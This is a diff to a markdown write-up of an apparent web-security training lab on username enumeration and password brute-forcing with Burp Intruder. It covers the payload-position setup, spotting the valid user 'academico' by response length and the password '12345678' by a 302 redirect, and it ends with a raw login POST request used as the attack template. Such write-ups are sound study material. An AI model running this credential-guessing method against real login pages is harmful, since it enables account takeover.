@@ -30,7 +30,7 @@ username=$hello$&password=1234
 
 $ represents the special symbol
 ```
-I then pasted the candidate username list into the Burp Intruder payload configuration tab before starting the attack. Once the attack is finished, I examined all the HTTP responses from the server to find which request has a different response compared to the others. By using a search filter, I looked for requests that does not have the term 'Invalid username'. This led to me to request 92, where the login request returned an 'Invalid password'.
+I then pasted the candidate username list into the Burp Intruder payload configuration tab before starting the attack. Once the attack is finished, I examined all the HTTP responses from the server to find which request has a different response compared to the others. By sorting the length column, I was able to find a response that differed from others, where upon closer inspection, returned an invalid password error. This confirmed that the account existed and could be used for our brute-force password attack.
 ```
 HTTP/2 200 OK
 Content-Type: text/html; charset=utf-8
@@ -105,6 +105,40 @@ Content-Length: 3246
     </body>
 </html>
 ```
-This tells us that the account usernam 'athena' exists, which allows us to focus the password brute-force attack on this account solely.  
+[Brute Forcing Password]
+This tells us that the account username 'academico' exists, which allows us to focus the password brute-force attack on this account solely.  
 
-Next, I reconfigured the request body in the Burp Intruder, only wrapping the password parameter in the special character whilst keeping the username as 'athena'. Then I added in the password list from the given candidate password list then started the attack again. 
+Next, I reconfigured the request body in the Burp Intruder, only wrapping the password parameter in the special character whilst keeping the username as 'academico'. Then I added in the password list from the given candidate password list then started the attack again. 
+
+For this attack, I looked for the HTTP response that differed from the others once again and found that for the request with the password '12345678', the response status code was 302 FOUND rather than 200 OK. This means the login was successful and I was able to gain the full credentials belonging to an existing user via brute-forcing.
+
+```
+Username: academico
+Password: 12345678
+```
+
+--- 
+Burpsuite Intruder HTTP Request Body
+```
+POST /login HTTP/1.1
+Host: 0a0a00d704e321688125895d004d00b5.web-security-academy.net
+Cookie: session=FIskibe8vHXeybUfhRuCTQMxuCTHRQIH
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:158.0) Gecko/20100101 Firefox/158.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Origin: https://0a0a00d704e321688125895d004d00b5.web-security-academy.net
+Referer: https://0a0a00d704e321688125895d004d00b5.web-security-academy.net/login
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+username=academico&password=peter
+```
